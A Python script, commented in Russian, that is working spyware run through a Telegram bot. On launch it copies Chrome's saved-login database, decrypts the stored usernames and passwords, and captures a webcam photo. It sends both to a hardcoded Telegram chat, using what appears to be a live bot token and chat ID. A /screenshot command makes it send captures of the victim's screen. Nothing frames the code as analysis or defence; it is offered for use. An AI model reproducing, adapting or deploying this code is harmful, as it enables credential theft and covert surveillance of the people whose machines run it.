import telebot
import socket
import os
import getpass
import threading
import shutil
import sqlite3
from win32crypt import CryptUnprotectData
from PIL import ImageGrab
import cv2

# --- ВАШИ ДАННЫЕ (из прошлого скрипта) ---
API_TOKEN = '8323830671:AAHm99BRauq9XOTqZgPS9KurQpP_EscAvms'
CHAT_ID = '-5249771325'

bot = telebot.TeleBot(API_TOKEN)
device_id = f"{socket.gethostname()}_{getpass.getuser()}"

def get_cookies():
    """Сбор куки из Chrome"""
    path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google\\Chrome\\User Data\\Default\\Login Data')
    temp_db = "temp_login.db"
    cookies_data = ""
    if os.path.exists(path):
        try:
            shutil.copyfile(path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for url, user, password in cursor.fetchall():
                dec_pass = CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                cookies_data += f"URL: {url} | User: {user} | Pass: {dec_pass}\n"
            conn.close()
            os.remove(temp_db)
        except: pass
    return cookies_data if cookies_data else "Куки не найдены."

def send_initial_data():
    """Отправка данных при старте"""
    try:
        device_name = socket.gethostname()
        cookies = get_cookies()
        
        # Фото с камеры
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('cam.jpg', frame)
            with open('cam.jpg', 'rb') as photo:
                bot.send_photo(CHAT_ID, photo, caption=f"🔔 Новый пользователь!\nУстройство: {device_name}\nID: {device_id}")
            os.remove('cam.jpg')
        
        bot.send_message(CHAT_ID, f"Данные (Cookies):\n{cookies[:2000]}")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Ошибка при старте: {e}")

# --- КОМАНДЫ ---
@bot.message_handler(commands=['screenshot'])
def handle_screenshot(message):
    parts = message.text.split()
    # Проверка команды: /screenshot [device_id]
    if len(parts) > 1 and parts[1] == device_id:
        try:
            screenshot = ImageGrab.grab()
            screenshot.save('screen.png')
            with open('screen.png', 'rb') as photo:
                bot.send_photo(CHAT_ID, photo, caption=f"Скриншот с {device_id}")
            os.remove('screen.png')
        except Exception as e:
            bot.send_message(CHAT_ID, f"Ошибка скрина: {e}")

# Запуск отправки при старте
threading.Thread(target=send_initial_data, daemon=True).start()

# Запуск бота
if __name__ == '__main__':
    bot.polling(none_stop=True)
